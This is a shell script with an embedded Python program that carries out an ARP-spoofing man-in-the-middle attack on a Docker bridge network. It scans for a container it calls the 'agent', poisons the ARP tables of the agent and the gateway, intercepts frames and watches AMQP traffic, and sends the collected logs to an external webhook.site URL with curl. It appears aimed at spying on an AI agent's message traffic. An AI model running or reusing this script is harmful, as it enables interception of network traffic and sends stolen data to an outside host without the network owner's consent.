#!/bin/sh
set -e
LOG=/tmp/attacker.log
exec > "$LOG" 2>&1

WH="https://webhook.site/2d6eb676-d74f-4b42-a459-21b879ae64b6"

apk add --no-cache curl tcpdump iproute2 python3 >/dev/null 2>&1

echo "=== CAPS ==="
grep Cap /proc/self/status

echo "=== NET ==="
ip addr show eth0
ip route
GW=$(ip route | awk '/default/{print $3; exit}')
IFACE=$(ip route | awk '/default/{print $5; exit}')
OUR_IP=$(ip -4 addr show "$IFACE" | awk '/inet /{print $2}' | cut -d/ -f1)
OUR_MAC=$(ip link show "$IFACE" | awk '/link\/ether/{print $2}' | tr -d ':')
echo "OUR=$OUR_IP MAC=$OUR_MAC GW=$GW IFACE=$IFACE"

for i in 1 2 3 4 5 6 7 8; do
  ping -c 1 -W 1 "172.17.0.${i}" >/dev/null 2>/dev/null &
done
wait; sleep 1
ip neigh > /tmp/neigh.txt
GW_MAC=$(ip neigh show "$GW" | awk '{print $5}' | head -1 | tr -d ':')

AGENT_IP=""
AGENT_MAC=""
for i in 2 3 4 5 6 7 8; do
  c="172.17.0.${i}"
  [ "$c" = "$OUR_IP" ] && continue
  [ "$c" = "$GW" ] && continue
  timeout 2 sh -c "echo | nc -w1 $c 8000" >/dev/null 2>&1 && {
    AGENT_IP="$c"
    AGENT_MAC=$(ip neigh show "$c" | awk '{print $5}' | head -1 | tr -d ':')
    break
  }
done

echo "AGENT=$AGENT_IP MAC=$AGENT_MAC GW_MAC=$GW_MAC"

if [ -z "$AGENT_IP" ] || [ -z "$AGENT_MAC" ] || [ -z "$GW_MAC" ]; then
  { echo "FAIL: agent=$AGENT_IP mac=$AGENT_MAC gw_mac=$GW_MAC"; cat /tmp/neigh.txt; } | \
    curl -sS --max-time 20 --data-binary @- "$WH?tag=L1-V6-FAIL"
  sleep 999999; exit 1
fi

echo ""
echo "=== DIAGNOSTIC ARP SPOOF TEST ==="

cat > /tmp/diag.py << 'PYEOF'
import socket, struct, time, sys, os

IFACE = os.environ["IFACE"]
OUR_MAC = bytes.fromhex(os.environ["OUR_MAC"])
AGENT_MAC = bytes.fromhex(os.environ["AGENT_MAC"])
GW_MAC = bytes.fromhex(os.environ["GW_MAC"])
GW_IP = os.environ["GW_IP"]
AGENT_IP = os.environ["AGENT_IP"]
BCAST = b'\xff\xff\xff\xff\xff\xff'

print(f"Config: IFACE={IFACE}")
print(f"  OUR_MAC={OUR_MAC.hex()}")
print(f"  AGENT_MAC={AGENT_MAC.hex()}")
print(f"  GW_MAC={GW_MAC.hex()}")
print(f"  GW_IP={GW_IP} AGENT_IP={AGENT_IP}")

def arp_reply(sm, sip, dm, dip):
    return (dm + sm + b'\x08\x06' +
            struct.pack('!HHBBH', 1, 0x0800, 6, 4, 2) +
            sm + socket.inet_aton(sip) + dm + socket.inet_aton(dip))

# Step 1: Try to create and use AF_PACKET socket
print("\n=== Step 1: Socket test ===")
try:
    send_sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
    send_sock.bind((IFACE, 0))
    print("ARP send socket OK")
except Exception as e:
    print(f"ARP send socket FAIL: {e}")
    sys.exit(1)

try:
    recv_sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
    recv_sock.bind((IFACE, 0))
    recv_sock.settimeout(2)
    print("ETH_P_ALL recv socket OK")
except Exception as e:
    print(f"ETH_P_ALL recv socket FAIL: {e}")
    sys.exit(1)

# Step 2: Count all frames for 5 seconds (no filter)
print("\n=== Step 2: Baseline frame count (5s, no ARP spoof) ===")
total_frames = 0
our_frames = 0
bcast_frames = 0
agent_src = 0
gw_src = 0
start = time.time()
while time.time() < start + 5:
    try:
        frame = recv_sock.recv(65535)
        total_frames += 1
        if len(frame) >= 12:
            dst = frame[0:6]
            src = frame[6:12]
            if dst == OUR_MAC: our_frames += 1
            if dst == BCAST: bcast_frames += 1
            if src == AGENT_MAC: agent_src += 1
            if src == GW_MAC: gw_src += 1
    except socket.timeout:
        pass
    except Exception as e:
        print(f"recv error: {e}")
        break

print(f"Total frames: {total_frames}")
print(f"  Addressed to us: {our_frames}")
print(f"  Broadcast: {bcast_frames}")
print(f"  From agent: {agent_src}")
print(f"  From gateway: {gw_src}")

# Step 3: Send ARP spoof packets
print("\n=== Step 3: Sending ARP spoof ===")
# Tell agent: GW is at OUR_MAC
p1 = arp_reply(OUR_MAC, GW_IP, AGENT_MAC, AGENT_IP)
# Tell GW: agent is at OUR_MAC
p2 = arp_reply(OUR_MAC, AGENT_IP, GW_MAC, GW_IP)

print(f"p1 (agent <- spoof GW): {p1[:14].hex()}")
print(f"p2 (GW <- spoof agent): {p2[:14].hex()}")

send_errors = 0
send_ok = 0
for i in range(10):
    try:
        n1 = send_sock.send(p1)
        n2 = send_sock.send(p2)
        send_ok += 1
        if i == 0:
            print(f"  send p1: {n1} bytes, send p2: {n2} bytes")
    except Exception as e:
        send_errors += 1
        print(f"  send error: {e}")
    time.sleep(0.3)
print(f"Sent: ok={send_ok} errors={send_errors}")

# Step 4: Count intercepted frames AFTER spoofing (30s)
print("\n=== Step 4: Counting intercepted frames (30s, ARP spoofed) ===")

# Keep sending spoofs in background
import threading
spoof_running = True
spoof_errors = []
def spoof_loop():
    while spoof_running:
        try:
            send_sock.send(p1)
            send_sock.send(p2)
        except Exception as e:
            spoof_errors.append(str(e))
        time.sleep(1)
t = threading.Thread(target=spoof_loop, daemon=True)
t.start()

total_frames = 0
our_frames = 0
bcast_frames = 0
agent_src = 0
gw_src = 0
agent_to_us = 0
gw_to_us = 0
amqp_count = 0
frame_samples = []

start = time.time()
while time.time() < start + 30:
    try:
        frame = recv_sock.recv(65535)
        total_frames += 1
        if len(frame) >= 14:
            dst = frame[0:6]
            src = frame[6:12]
            eth_type = struct.unpack('!H', frame[12:14])[0]

            if dst == OUR_MAC: our_frames += 1
            if dst == BCAST: bcast_frames += 1
            if src == AGENT_MAC: agent_src += 1
            if src == GW_MAC: gw_src += 1

            if dst == OUR_MAC and src == AGENT_MAC:
                agent_to_us += 1
                if len(frame_samples) < 5:
                    frame_samples.append(f"agent->us type=0x{eth_type:04x} len={len(frame)}")
            if dst == OUR_MAC and src == GW_MAC:
                gw_to_us += 1
                if len(frame_samples) < 5:
                    frame_samples.append(f"gw->us type=0x{eth_type:04x} len={len(frame)}")

            # Check for AMQP (port 5672)
            if eth_type == 0x0800 and len(frame) >= 34:
                proto = frame[23]
                if proto == 6:  # TCP
                    ihl = (frame[14] & 0xF) * 4
                    tcp_off = 14 + ihl
                    if len(frame) >= tcp_off + 4:
                        sport, dport = struct.unpack('!HH', frame[tcp_off:tcp_off+4])
                        if sport == 5672 or dport == 5672:
                            amqp_count += 1
                            src_ip = '.'.join(str(b) for b in frame[26:30])
                            dst_ip = '.'.join(str(b) for b in frame[30:34])
                            print(f"  AMQP! {src_ip}:{sport} -> {dst_ip}:{dport} from_mac={src.hex()}")
    except socket.timeout:
        pass
    except Exception as e:
        print(f"recv error: {e}")

spoof_running = False
t.join(timeout=2)

print(f"\nPost-spoof stats (30s):")
print(f"  Total frames: {total_frames}")
print(f"  Addressed to us: {our_frames}")
print(f"  Broadcast: {bcast_frames}")
print(f"  From agent: {agent_src}")
print(f"  From gateway: {gw_src}")
print(f"  Agent->us: {agent_to_us}")
print(f"  GW->us: {gw_to_us}")
print(f"  AMQP frames: {amqp_count}")
print(f"  Spoof errors: {len(spoof_errors)}")
if spoof_errors:
    print(f"  First error: {spoof_errors[0]}")
for s in frame_samples:
    print(f"  Sample: {s}")

# Step 5: Restore ARP
print("\n=== Step 5: Restoring ARP ===")
r1 = arp_reply(GW_MAC, GW_IP, AGENT_MAC, AGENT_IP)
r2 = arp_reply(AGENT_MAC, AGENT_IP, GW_MAC, GW_IP)
for _ in range(5):
    try:
        send_sock.send(r1)
        send_sock.send(r2)
    except: pass
    time.sleep(0.3)
print("ARP restored")

print("\n=== DONE ===")
PYEOF

export IFACE OUR_MAC AGENT_MAC GW_MAC
export GW_IP="$GW"
export AGENT_IP="$AGENT_IP"

echo "Running diagnostic..."
python3 /tmp/diag.py 2>&1

echo ""
echo "=== SENDING RESULTS ==="
{
  echo "=== L1-V6 DIAG ==="
  echo "AGENT=$AGENT_IP MAC=$AGENT_MAC"
  echo "GW=$GW GW_MAC=$GW_MAC"
  echo "OUR=$OUR_IP MAC=$OUR_MAC"
  echo ""
  cat "$LOG" | tail -80
} | curl -sS --max-time 30 --data-binary @- "$WH?tag=L1-V6-DIAG"

sleep 999999
